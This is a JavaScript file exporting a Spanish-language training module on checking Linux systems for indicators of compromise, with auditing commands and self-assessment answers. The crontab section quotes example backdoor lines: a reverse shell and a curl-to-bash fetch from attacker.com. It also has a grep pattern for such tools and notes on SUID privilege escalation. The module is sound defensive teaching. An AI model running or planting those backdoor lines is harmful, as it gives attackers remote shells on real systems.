const content = `
## Módulo 5 — Indicadores de compromiso: ¿cómo saber si fui comprometido?

### 🎯 Objetivos de aprendizaje

* Ejecutar una checklist sistemática de indicadores de compromiso (IoC) en Linux.
* Detectar usuarios, binarios y crontabs no autorizados.
* Identificar conexiones de red y procesos sospechosos.
* Encontrar procesos cuyos binarios fueron eliminados del disco (técnica de evasión común).
* Verificar la integridad de binarios del sistema con rpm y dpkg.

### ❓ El problema real

¿Cómo saber si un sistema ha sido comprometido si el atacante no dejó alertas obvias? Un sistema comprometido puede verse completamente normal desde fuera. Los indicadores de compromiso son evidencias técnicas que, individualmente, pueden tener explicación legítima, pero en conjunto pintan un cuadro claro. La diferencia entre un analista de seguridad y un administrador de sistemas es saber exactamente dónde mirar.

### 📖 Checklist de IoC: usuarios y autenticación

\`\`\`bash
# 1. Usuarios con UID 0 (deberían ser solo root)
awk -F: '\$3 == 0 {print \$1, \$3, \$7}' /etc/passwd
# Salida normal: root 0 /bin/bash
# ALERTA: cualquier otro usuario con UID 0

# 2. Usuarios con shell válida (pueden hacer login)
grep -v "nologin\|false" /etc/passwd | awk -F: '{print \$1, \$3, \$7}'

# 3. Usuarios recién creados (comparar con fecha de compromiso sospechosa)
getent passwd | sort -t: -k3 -n | tail -10
ls -la /home/

# 4. Claves SSH autorizadas en cuentas críticas
for user in root \$(awk -F: '\$3 >= 1000 {print \$1}' /etc/passwd); do
    homedir=\$(getent passwd "\$user" | cut -d: -f6)
    if [ -f "\$homedir/.ssh/authorized_keys" ]; then
        echo "=== \$user ==="
        cat "\$homedir/.ssh/authorized_keys"
    fi
done

# 5. Contraseñas vacías (usuarios sin contraseña)
awk -F: '\$2 == "" {print "SIN CONTRASEÑA:", \$1}' /etc/shadow
\`\`\`

### 📖 Checklist de IoC: binarios SUID sospechosos

\`\`\`bash
# Listar todos los binarios con bit SUID
find / -perm -4000 -type f 2>/dev/null

# Salida esperada (limpia) en Debian/Ubuntu típico:
# /usr/bin/su
# /usr/bin/sudo
# /usr/bin/passwd
# /usr/bin/gpasswd
# /usr/bin/newgrp
# /usr/bin/chfn
# /usr/bin/chsh
# /usr/lib/openssh/ssh-keysign
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper
# /bin/ping
# /bin/mount
# /bin/umount

# ALERTA: cualquier binario fuera de esta lista, especialmente:
# /tmp/anything     → ruta temporal = sospechoso
# /usr/bin/vim      → editor con SUID = escala privilegios trivialmente
# /usr/bin/python*  → intérprete con SUID = shell root inmediata
# /usr/bin/find     → con SUID ejecuta comandos como root
# /usr/bin/nmap     → versiones antiguas tienen modo interactivo

# Comparar contra lista de referencia guardada
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid-current.txt
diff /root/suid-baseline.txt /tmp/suid-current.txt

# Binarios con SGID (también pueden escalar privilegios)
find / -perm -2000 -type f 2>/dev/null
\`\`\`

### 📖 Checklist de IoC: crontabs

\`\`\`bash
# Revisar todos los crontabs del sistema
echo "=== /etc/crontab ==="
cat /etc/crontab

echo "=== /etc/cron.d/ ==="
ls -la /etc/cron.d/
for f in /etc/cron.d/*; do echo "--- \$f ---"; cat "\$f"; done

echo "=== /etc/cron.hourly/ daily/ weekly/ monthly/ ==="
ls -la /etc/cron.{hourly,daily,weekly,monthly}/

# Crontabs de usuarios individuales
echo "=== Crontabs de usuarios ==="
for user in \$(cut -f1 -d: /etc/passwd); do
    crontab -u "\$user" -l 2>/dev/null | grep -v "^#" | grep -v "^\$" | \
    while read line; do
        echo "\$user: \$line"
    done
done

# Patrones sospechosos en crontabs
grep -rn "bash -i\|/dev/tcp\|nc \|ncat \|curl.*|.*bash\|wget.*|.*bash\|python.*-c\|perl.*-e" \
  /etc/cron* /var/spool/cron/ 2>/dev/null

# Ejemplo de backdoor en crontab:
# * * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1
# */5 * * * * root curl -s http://attacker.com/update.sh | bash
\`\`\`

### 📖 Checklist de IoC: conexiones de red sospechosas

\`\`\`bash
# Conexiones establecidas actualmente
ss -tnp

# Salida a analizar:
# State    Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process
# ESTAB    0       0       10.0.0.5:22         192.168.1.100:54321  users:("sshd")
# ESTAB    0       0       10.0.0.5:44123      185.220.101.1:4444   users:("bash") ← ALERTA

# Servicios escuchando en puertos inusuales
ss -tlnp

# Conexiones salientes a IPs desconocidas en puertos inusuales
ss -tnp | grep ESTAB | grep -v ":22 \|:443 \|:80 \|:53 "

# Con netstat (si está disponible)
netstat -an | grep ESTABLISHED | grep -v "127.0.0.1"

# Identificar proceso detrás de cada conexión
lsof -i -n -P | grep ESTABLISHED

# Conexiones que el proceso intenta ocultar (buscar en /proc)
for pid in /proc/[0-9]*; do
    pid_num=\${pid##*/}
    if [ -d "\$pid/net" ]; then
        # Revisar conexiones TCP del proceso
        cat "\$pid/net/tcp" 2>/dev/null
    fi
done 2>/dev/null
\`\`\`

### 📖 Indicador avanzado: procesos con binarios eliminados

Técnica de evasión común: el atacante ejecuta un binario malicioso y luego lo elimina del disco. El proceso sigue corriendo en memoria pero no aparece como archivo.

\`\`\`bash
# Detectar procesos cuyo ejecutable fue eliminado del disco
ls -la /proc/*/exe 2>/dev/null | grep deleted

# Ejemplo de salida sospechosa:
# lrwxrwxrwx 1 root root 0 Jan 15 03:50 /proc/1337/exe -> /tmp/.x (deleted)

# Ver qué proceso es
cat /proc/1337/cmdline | tr '\0' ' '
# Salida: /tmp/.x -l 0.0.0.0 -p 4444

# Ver mapas de memoria del proceso
cat /proc/1337/maps | head -5

# Recuperar el binario desde la memoria para análisis
cp /proc/1337/exe /tmp/recovered-binary
file /tmp/recovered-binary
strings /tmp/recovered-binary | grep -i "http\|connect\|/bin/sh\|/bin/bash"
\`\`\`

### 📖 Checklist de IoC: integridad de binarios del sistema

\`\`\`bash
# En sistemas RPM (RHEL, CentOS, Fedora)
# Verificar integridad de todos los paquetes instalados
rpm -Va

# Salida (ejemplo con modificaciones):
# S.5....T.    /bin/ls        ← tamaño y hash cambiaron
# .......T.    /usr/bin/who   ← solo mtime cambió (menos grave)
# S.5....T.    /usr/lib/libpam.so.0  ← CRÍTICO

# Significado de los caracteres:
# S = tamaño de archivo cambió
# M = permisos/tipo cambiaron
# 5 = hash MD5/SHA256 cambió
# D = número de dispositivo cambió
# L = lectura de symlink cambió
# U = propietario cambió
# G = grupo cambió
# T = mtime cambió

# En sistemas Debian/Ubuntu (dpkg)
dpkg --verify

# Ejemplo de salida:
# ??5??????   /bin/ls        ← hash no coincide = COMPROMETIDO

# Verificar un paquete específico
dpkg --verify coreutils
rpm -V coreutils
\`\`\`

### 📖 Archivos ocultos en directorios temporales

\`\`\`bash
# Buscar archivos ocultos en /tmp y /var/tmp
ls -la /tmp/ /var/tmp/
find /tmp /var/tmp -name ".*" -ls 2>/dev/null

# Buscar ejecutables en /tmp (inusual y sospechoso)
find /tmp /var/tmp -type f -executable 2>/dev/null

# Buscar archivos con nombres diseñados para pasar desapercibidos
find /tmp /var/tmp -name ".. " -o -name "…" 2>/dev/null

# Buscar scripts/binarios recientes en directorios de sistema
find /usr /bin /sbin -newer /etc/passwd -type f 2>/dev/null | head -20

# Bash history sospechosa
cat /root/.bash_history
# Señales de alerta:
# - Comandos que descargan y ejecutan scripts (curl | bash)
# - Modificaciones a /etc/passwd o /etc/shadow
# - Compilación de código en /tmp
# - Comandos de reconocimiento de red (nmap, masscan)
# - Ausencia total de historial (el atacante ejecutó: history -c; unset HISTFILE)
\`\`\`

### 📋 Lo que debes recordar

* Cualquier usuario con UID 0 que no sea \`root\` es compromiso confirmado.
* Binarios SUID en \`/tmp\`, \`/var/tmp\` o en rutas inusuales son señal crítica.
* Procesos con \`(deleted)\` en \`/proc/PID/exe\` son técnica de evasión clásica.
* \`rpm -Va\` y \`dpkg --verify\` detectan binarios del sistema modificados.
* Un \`bash_history\` vacío donde normalmente habría comandos es evidencia de manipulación.

### 🧪 Autoevaluación

1. ¿Por qué un proceso con \`/proc/1337/exe -> /tmp/.x (deleted)\` es especialmente sospechoso?
2. \`rpm -Va\` reporta \`S.5....T. /bin/ls\`. ¿Qué significa exactamente y cuál es la implicación de seguridad?
3. Un atacante quiere pasar desapercibido y ejecuta su malware. ¿Qué haría con el binario después de lanzarlo para dificultar la detección?

---

1. Porque indica que se ejecutó un binario desde \`/tmp\` (inusual para software legítimo) y luego el archivo fue eliminado del disco deliberadamente. Esta es una técnica de evasión: el proceso sigue corriendo en memoria y puede estar abriendo conexiones de red o ejecutando comandos, pero el archivo binario ya no existe en disco para ser analizado directamente. Es una señal fuerte de actividad maliciosa.
2. \`S\` significa que el tamaño del archivo cambió y \`5\` significa que el hash criptográfico no coincide con el registrado en la base de datos del paquete. Para \`/bin/ls\`, esto indica que el binario \`ls\` fue modificado o reemplazado, que es la técnica clásica de un rootkit: reemplazar herramientas del sistema para ocultar archivos, procesos o conexiones del atacante.
3. Eliminaría el binario del disco después de ejecutarlo (\`rm /tmp/malware\`). El proceso sigue corriendo en memoria (aparece en \`ps\` como el nombre del proceso pero sin archivo en disco), el \`/proc/PID/exe\` muestra \`(deleted)\`, y no hay ningún archivo que un AV o AIDE pueda escanear en disco. Para recuperarlo, habría que copiar \`/proc/PID/exe\`.
`

export default content
